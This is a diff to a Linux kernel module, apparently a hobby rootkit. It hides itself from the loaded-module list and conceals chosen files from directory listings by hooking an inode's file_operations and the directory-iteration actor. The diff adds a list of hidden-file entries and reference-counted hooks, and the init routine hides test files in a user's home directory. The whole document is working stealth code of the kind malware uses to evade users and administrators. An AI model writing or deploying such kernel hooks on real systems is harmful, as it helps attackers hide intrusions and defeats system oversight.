@@ -13,9 +13,8 @@ MODULE_VERSION("0.1.0");
 
 static struct list_head *modules;
 
-// TODO: Provide a way for the module to control the path(s).
 static char *test_path_name = "/home/yanayg/test_file";
-static const char *test_file_name = "test_file";
+static char *test_path_name2 = "/home/yanayg/test_file2";
 
 static void hide_module(void) {
     // Save the list for later so we can add the module back in.
@@ -54,7 +53,9 @@ static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
 struct fops_hook {
     struct list_head head;
     unsigned long ino;
+    struct file_operations *fops;
     struct file_operations *prev_fops;
+    unsigned int refcount;
 };
 
 static LIST_HEAD(fops_hooks);
@@ -62,13 +63,16 @@ static LIST_HEAD(fops_hooks);
 static int create_fops_hook(struct inode *inode, struct file_operations **file_operations) {
 	struct fops_hook *fops_hook;
 
-	fops_hook = (struct fops_hook *)kmalloc(sizeof(struct fops_hook), GFP_KERNEL);
-	fops_hook->ino = inode->i_ino;
-	fops_hook->prev_fops = inode->i_fop;
-	list_add(&fops_hook->head, &fops_hooks);
-
 	*file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
 	memcpy(*file_operations, inode->i_fop, sizeof(struct file_operations));
+
+	fops_hook = (struct fops_hook *)kmalloc(sizeof(struct fops_hook), GFP_KERNEL);
+	fops_hook->ino = inode->i_ino;
+	fops_hook->fops = *file_operations;
+	fops_hook->prev_fops = inode->i_fop;
+    fops_hook->refcount = 1;
+	list_add(&fops_hook->head, &fops_hooks);
+
 	inode->i_fop = *file_operations;
 	return 0;
 
@@ -77,9 +81,13 @@ static int create_fops_hook(struct inode *inode, struct file_operations **file_o
 static int free_fops_hook(struct inode *inode) {
     struct list_head *pos;
     struct fops_hook *entry;
+    unsigned int refcount;
+
 	list_for_each(pos, &fops_hooks) {
 	    entry = list_entry(pos, struct fops_hook, head);
 	    if (entry->ino == inode->i_ino) {
+            refcount = --(entry->refcount);
+            if (refcount) return 0;
 	        kfree(inode->i_fop);
 	    	inode->i_fop = entry->prev_fops;
 	        list_del(&entry->head);
@@ -102,25 +110,69 @@ static struct fops_hook *get_fops_hook(const struct inode *inode) {
 	return NULL;
 }
 
+struct hidden_file_entry {
+    struct list_head head;
+    unsigned long ino;
+    char *file_name;
+};
+
+static LIST_HEAD(hidden_files);
+
+static int create_hidden_file_entry(const struct inode *inode, const char *file_name) {
+	char *inner_file_name;
+	struct hidden_file_entry *hidden_file;
+
+	inner_file_name = (char *)kmalloc(sizeof(char) + strlen(file_name), GFP_KERNEL);
+	strcpy(inner_file_name, file_name);
+
+	hidden_file = (struct hidden_file_entry *)kmalloc(sizeof(struct hidden_file_entry), GFP_KERNEL);
+	hidden_file->ino = inode->i_ino;
+	hidden_file->file_name = inner_file_name;
+
+	list_add(&hidden_file->head, &hidden_files);
+	return 0;
+}
+
+static int free_hidden_file_entry(const struct inode *inode, const char *file_name) {
+    struct list_head *pos;
+    struct hidden_file_entry *entry;
+	list_for_each(pos, &hidden_files) {
+	    entry = list_entry(pos, struct hidden_file_entry, head);
+	    if (entry->ino == inode->i_ino && !strcmp(entry->file_name, file_name)) {
+	        kfree(entry->file_name);
+	        list_del(&entry->head);
+	        kfree(entry);
+	        return 0;
+	    }
+	}
+	return -1;
+}
+
 struct hooked_dir_context {
     struct list_head head;
     struct dir_context *ctx;
     filldir_t prev_actor;
+    unsigned long ino;
 };
 
 static LIST_HEAD(hooked_dir_context_list);
 
 static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
     struct list_head *pos;
+    struct list_head *file_pos;
     struct hooked_dir_context *entry;
+    struct hidden_file_entry *hidden_file;
 
 	list_for_each(pos, &hooked_dir_context_list) {
 	    entry = list_entry(pos, struct hooked_dir_context, head);
 	    if (entry->ctx == ctx) {
 	    	printk(KERN_INFO "Called hooked actor! %s", name);
-	    	if (!strcmp(name, test_file_name)) {
-	    	    return 0;
-	    	}
+	        list_for_each(file_pos, &hidden_files) {
+	            hidden_file = list_entry(file_pos, struct hidden_file_entry, head);
+                if (hidden_file->ino == entry->ino && !strcmp(name, hidden_file->file_name)) {
+                    return 0;
+                }
+	        }
 	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
 	    }
 	}
@@ -128,22 +180,18 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
 }
 
 static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
-    int res;
     struct hooked_dir_context *hook;
     struct fops_hook *fops_hook;
 	printk(KERN_INFO "Called hooked iterate!");
 	hook = (struct hooked_dir_context *)kmalloc(sizeof(struct hooked_dir_context), GFP_KERNEL);
 	hook->ctx = dir_context;
 	hook->prev_actor = dir_context->actor;
+	hook->ino = filp->f_inode->i_ino;
 	list_add(&hook->head, &hooked_dir_context_list);
 	dir_context->actor = new_actor;
 	fops_hook = get_fops_hook(filp->f_inode);
 	if (fops_hook == NULL) return -1;
-	res = fops_hook->prev_fops->iterate_shared(filp, dir_context);
-	if (res) {
-	    return res;
-	}
-    return 0;
+	return fops_hook->prev_fops->iterate_shared(filp, dir_context);
 }
 
 static char *strtok_r(char *str, const char *delim) {
@@ -163,6 +211,7 @@ static int hide_file(const char *path_name) {
 	char *dir_path;
 	char *file_name;
 	struct inode *inode;
+	struct fops_hook *fops_hook;
 	struct file_operations *file_operations;
 
 	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
@@ -174,7 +223,19 @@ static int hide_file(const char *path_name) {
 	}
 	kfree(dir_path);
 
+	if ((retval = create_hidden_file_entry(inode, file_name))) {
+	    return retval;
+	}
+
+	fops_hook = get_fops_hook(inode);
+	if (fops_hook != NULL) {
+	    fops_hook->refcount++;
+	    fops_hook->fops->iterate_shared = new_iterate_shared;
+	    return 0;
+	}
+
 	if ((retval = create_fops_hook(inode, &file_operations))) {
+	    free_hidden_file_entry(inode, file_name);
 	    return retval;
 	}
 
@@ -198,11 +259,17 @@ static int unhide_file(const char *path_name) {
 	}
     kfree(dir_path);
 
+    if ((retval = free_hidden_file_entry(inode, file_name))) {
+	    return retval;
+	}
+
 	return free_fops_hook(inode);
 }
 
 static int __init MRK_initialize(void) {
 	hide_file(test_path_name);
+	hide_file(test_path_name2);
+	unhide_file(test_path_name2);
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
